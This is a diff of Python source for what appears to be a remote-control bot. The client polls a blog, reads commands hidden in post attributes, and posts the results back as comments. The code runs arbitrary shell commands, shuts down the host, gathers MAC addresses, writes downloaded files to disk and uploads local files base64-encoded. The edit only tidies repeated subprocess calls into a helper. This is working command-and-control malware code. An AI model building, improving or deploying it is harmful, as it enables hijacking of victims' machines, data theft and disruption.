@@ -23,6 +23,12 @@ def send_comment(payload):
     r = requests.post(URL + '/newcomment', data=payload)
     return r
 
+def run_command(command):
+    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    stdout_v = proc.stdout.read() + proc.stderr.read()
+    output = stdout_v.split()
+    return output
+
 def process_actions(posts):
     for post in posts:
         a_date = post.find("span", {"class": "post-date"}).getText()
@@ -33,16 +39,13 @@ def process_actions(posts):
             action = a_post.attrs.get("data-action",)
             if action == "shutdown-host":
                 command = "shutdown /s /t 0"
-                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                data = proc.stdout.read() + proc.stderr.read()
+                data = run_command(command)
             elif action == "shutdown-client":
                 exit()
             elif action == "get-mac":
                 command = "ipconfig /all | findstr /i \"Physical\""
-                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                stdout_v = proc.stdout.read() + proc.stderr.read()
-                output = stdout_v.split()
-                data = [item for item in output if len(item) == 17]
+                results = run_command(command)
+                data = [item for item in results if len(item) == 17]
             elif action == "download-file":
                 text = a_post.get_text()[2:-1]
                 contents = base64.b64decode(text)
@@ -59,13 +62,12 @@ def process_actions(posts):
                     with open(filename,'r+b') as f:
                         data = base64.b64encode(f.read())
                 except:
-                    data = "Failed top open the file"
+                    data = "Failed to open the file"
             elif action == "shell-command":
                 command = a_post.getText()
-                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                data = proc.stdout.read() + proc.stderr.read()
+                data = run_command(command)
+
             post_id = post.find("a")['href'].split('/')[-1]
-            #print('Ran command: {0}\n{1}'.format(action, str(data)))
             data = '{0}, {1}, {2}'.format(UUID, action, str(data))
             payload = {'username': 'bot', 'body': data, 'post_id': post_id, 'action': action}
             status = send_comment(payload)
